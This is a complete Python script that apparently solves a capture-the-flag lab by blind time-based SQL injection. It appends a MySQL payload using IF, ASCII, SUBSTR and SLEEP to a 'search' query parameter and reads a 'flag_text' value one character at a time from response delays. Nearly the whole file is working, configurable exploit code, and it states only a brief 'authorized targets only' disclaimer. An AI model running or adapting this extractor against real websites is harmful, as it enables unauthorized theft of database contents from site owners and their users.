#!/usr/bin/env python3
"""
extract_flag.py

Usage:
  python3 extract_flag.py --url "https://qry9mna9o2.voorivex-lab.online/" \
    --positions 37 --start 0 --end 122 --sleep 5 --threshold 4.0

Only use on targets you are authorized to test.
"""

import argparse
import time
import sys
from urllib.parse import quote_plus, urlparse, urlunparse
import requests

# -------- Build and send requests, measure time --------
def build_payload(pos, asc, sleep_time):
    # raw readable payload (we will URL-encode)
    # note: we include LIMIT 1 to avoid multi-row ambiguity
    raw = "|| IF(ASCII(SUBSTR((SELECT flag_text FROM flag LIMIT 1), {}, 1)) = {}, SLEEP({}), 0) #\\".format(pos, asc, sleep_time)
    # Use quote_plus so spaces -> + (matching your examples)
    return quote_plus(raw, safe='')

def make_request(base_url, payload_encoded, timeout=20):
    # decide how to append the query parameter properly
    p = urlparse(base_url)
    # if there's already a query part, append with &
    if p.query:
        new_query = p.query + "&search=" + payload_encoded
    else:
        new_query = "search=" + payload_encoded
    newp = p._replace(query=new_query)
    full = urlunparse(newp)
    # send GET
    start = time.time()
    try:
        r = requests.get(full, timeout=timeout)
        elapsed = time.time() - start
        return elapsed, r
    except requests.exceptions.RequestException as e:
        elapsed = time.time() - start
        return elapsed, None

# -------- CLI and main logic --------
def main():
    parser = argparse.ArgumentParser(description="Blind time-based extractor for flag_text FROM flag")
    parser.add_argument("--url", required=True, help="Base URL (e.g. https://example.com/ ). Script will append ?search=payload")
    parser.add_argument("--positions", type=int, default=37, help="Number of characters to probe (default 37)")
    parser.add_argument("--start", type=int, default=0, help="ASCII start (inclusive, default 0)")
    parser.add_argument("--end", type=int, default=122, help="ASCII end (inclusive, default 122)")
    parser.add_argument("--sleep", type=int, default=5, help="SLEEP(x) value used in payloads (default 5)")
    parser.add_argument("--threshold", type=float, default=4.0, help="Response time threshold to consider a match (default 4.0s)")
    parser.add_argument("--timeout", type=int, default=20, help="HTTP request timeout seconds (default 20)")
    parser.add_argument("--delay-between", type=float, default=0.1, help="Delay between requests to avoid rate limits (seconds) (default 0.1)")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    base_url = args.url
    pos_count = args.positions
    start = args.start
    end = args.end
    sleep_time = args.sleep
    threshold = args.threshold
    to = args.timeout
    delay_between = args.delay_between
    verbose = args.verbose

    print("[*] Target:", base_url)
    print("[*] Positions:", pos_count, "ASCII range:", start, "-", end, "SLEEP:", sleep_time, "Threshold:", threshold)
    print("[*] Make sure you are authorized to test this target. Proceeding...")

    found_chars = []

    session = requests.Session()
    # set a reasonable user-agent
    session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; extractor/1.0)"})

    for pos in range(1, pos_count + 1):
        matched = None
        print("\n[*] Testing position", pos)
        for asc in range(start, end + 1):
            payload_encoded = build_payload(pos, asc, sleep_time)
            # build full url
            elapsed, resp = None, None
            try:
                # use session.get for persistent conn
                full = None
                p = urlparse(base_url)
                if p.query:
                    new_query = p.query + "&search=" + payload_encoded
                else:
                    new_query = "search=" + payload_encoded
                newp = p._replace(query=new_query)
                full = urlunparse(newp)
                if verbose:
                    print("  -> trying ascii", asc, "payload:", full)
                start_t = time.time()
                r = session.get(full, timeout=to)
                elapsed = time.time() - start_t
            except Exception as e:
                elapsed = time.time() - start_t if 'start_t' in locals() else 0.0
                if verbose:
                    print("  !! request exception:", e)
                # if request fails, treat as non-match (or you may want to retry)
                time.sleep(delay_between)
                continue

            if verbose:
                print("    time: {:.3f}s status: {}".format(elapsed, r.status_code if r is not None else "N/A"))

            # decide if we consider this a match
            if elapsed >= threshold:
                # match found for this position
                try:
                    ch = chr(asc)
                    printable = ch if (32 <= asc <= 126) else "\\x{:02x}".format(asc)
                except Exception:
                    printable = "\\x{:02x}".format(asc)
                print("  [+] position {} = '{}' (ascii {}) — time {:.3f}s".format(pos, printable, asc, elapsed))
                matched = (asc, printable)
                found_chars.append(matched)
                break
            # small delay to avoid hammering
            time.sleep(delay_between)

        if not matched:
            print("  [-] position {}: no ascii match in range {}-{}".format(pos, start, end))
            found_chars.append((None, None))

    # summary
    print("\n=== Extraction result ===")
    result_display = []
    for i, (asc, printable) in enumerate(found_chars, start=1):
        if asc is None:
            result_display.append("?")
        else:
            result_display.append(printable)
    print("Positions probed:", pos_count)
    print("Result (readable):", "".join(result_display))
    print("Result (raw pairs):")
    for i, (asc, printable) in enumerate(found_chars, start=1):
        print(" pos {:2d}: {}".format(i, "{} ({})".format(printable, asc) if asc is not None else "<no match>"))

if __name__ == "__main__":
    main()
